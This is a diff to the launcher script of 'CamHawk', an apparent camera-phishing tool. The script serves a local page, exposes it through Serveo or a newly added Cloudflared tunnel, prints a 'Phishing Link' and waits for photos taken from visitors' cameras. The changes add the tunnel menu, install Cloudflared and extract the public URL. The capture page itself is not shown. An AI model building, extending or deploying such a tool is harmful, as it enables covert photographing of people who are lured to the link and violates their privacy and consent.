@@ -12,16 +12,13 @@ SERVER_PORT=3000
 SERVER_PID=""
 TUNNEL_PID=""
 PHISHING_URL=""
+TUNNEL_CHOICE=""
 
 # Banner
 banner() {
  clear
-    
-echo -e "${YELLOW}"
-
-
-cat << "EOF" 
-
+ echo -e "${YELLOW}"
+ cat << "EOF" 
 
    _____                _    _                _    
   / ____|              | |  | |              | |   
@@ -34,10 +31,7 @@ cat << "EOF"
                                 Developer : Sreeraj
 
 EOF
- 
-echo -e "${GREEN}* GitHub: https://github.com/s-r-e-e-r-a-j\n${RESET}"
-
-
+ echo -e "${GREEN}* GitHub: https://github.com/s-r-e-e-r-a-j\n${RESET}"
 }
 
 # Install Dependencies
@@ -60,14 +54,17 @@ install_dependencies() {
     }
 
     npm list -g --depth=0 | grep -q 'express@' || { 
-    echo -e "${RED}[-] Express.js is not installed! Installing...${RESET}"; 
-    sudo npm install -g express; 
-    
+        echo -e "${RED}[-] Express.js is not installed! Installing...${RESET}"; 
+        sudo npm install -g express; 
+    }
+
+    command -v cloudflared > /dev/null 2>&1 || { 
+        echo -e "${RED}[-] Cloudflared is not installed! Installing...${RESET}"; 
+        sudo wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared && sudo chmod +x /usr/local/bin/cloudflared; 
     }
 
     echo -e "${GREEN}[+] All dependencies are installed!${RESET}"
 }
-
 
 # Kill Any Existing Server on Port 3000
 kill_old_server() {
@@ -94,6 +91,21 @@ start_server() {
     fi
 }
 
+# Tunnel Selection Menu
+select_tunnel() {
+    echo -e "${YELLOW}[+] Select a tunnel:${RESET}"
+    echo -e "${BLUE}[1] Serveo.net (Recommended)${RESET}"
+    echo -e "${BLUE}[2] Cloudflared${RESET}"
+    echo -ne "${GREEN}Enter choice (1 or 2):${RESET} "
+    read  choice
+
+    case $choice in
+        1) TUNNEL_CHOICE="serveo" ;;
+        2) TUNNEL_CHOICE="cloudflared" ;;
+        *) echo -e "${RED}[-] Invalid choice! Defaulting to Serveo.net.${RESET}"; TUNNEL_CHOICE="serveo" ;;
+    esac
+}
+
 # Start Serveo.net Tunneling
 start_serveo() {
     echo -e "${YELLOW}[+] Starting Serveo.net tunnel...${RESET}"
@@ -111,6 +123,28 @@ start_serveo() {
     fi
 }
 
+# Start Cloudflared Tunneling (Fixed)
+start_cloudflared() {
+    echo -e "${YELLOW}[+] Starting Cloudflared tunnel...${RESET}"
+    cloudflared tunnel --url "http://localhost:$SERVER_PORT" > cloudflared.txt 2>&1 &
+    TUNNEL_PID=$!
+    sleep 5
+
+    # Wait for Cloudflared to generate the link properly
+    for i in {1..10}; do
+        PHISHING_URL=$(grep -oE "https://[a-zA-Z0-9.-]+\.trycloudflare.com" cloudflared.txt)
+        if [[ ! -z "$PHISHING_URL" ]]; then
+            echo -e "${GREEN}[+] Phishing Link: ${PHISHING_URL}${RESET}"
+            return
+        fi
+        sleep 1
+    done
+
+    echo -e "${RED}[-] Cloudflared failed to start!${RESET}"
+    stop_server
+    exit 1
+}
+
 # Monitor for Received Photos
 monitor_photos() {
     echo -e "${YELLOW}[+] Waiting for photos...${RESET}"
@@ -122,19 +156,11 @@ monitor_photos() {
     done
 }
 
-
 # Stop the Server
 stop_server() {
     echo -e "${YELLOW}[+] Stopping CamHawk server...${RESET}"
-    if [[ ! -z "$SERVER_PID" ]]; then
-        kill $SERVER_PID 2>/dev/null
-        echo -e "${GREEN}[+] Server stopped!${RESET}"
-    fi
-
-    if [[ ! -z "$TUNNEL_PID" ]]; then
-        kill $TUNNEL_PID 2>/dev/null
-        echo -e "${GREEN}[+] Serveo tunnel stopped!${RESET}"
-    fi
+    [[ ! -z "$SERVER_PID" ]] && kill $SERVER_PID 2>/dev/null && echo -e "${GREEN}[+] Server stopped!${RESET}"
+    [[ ! -z "$TUNNEL_PID" ]] && kill $TUNNEL_PID 2>/dev/null && echo -e "${GREEN}[+] Tunnel stopped!${RESET}"
     exit 0
 }
 
@@ -144,7 +170,14 @@ trap stop_server SIGINT
 # Run the script
 banner
 install_dependencies
-kill_old_server  # Kill any process using port 3000
+kill_old_server
 start_server
-start_serveo
+select_tunnel
+
+if [[ "$TUNNEL_CHOICE" == "serveo" ]]; then
+    start_serveo
+else
+    start_cloudflared
+fi
+
 monitor_photos
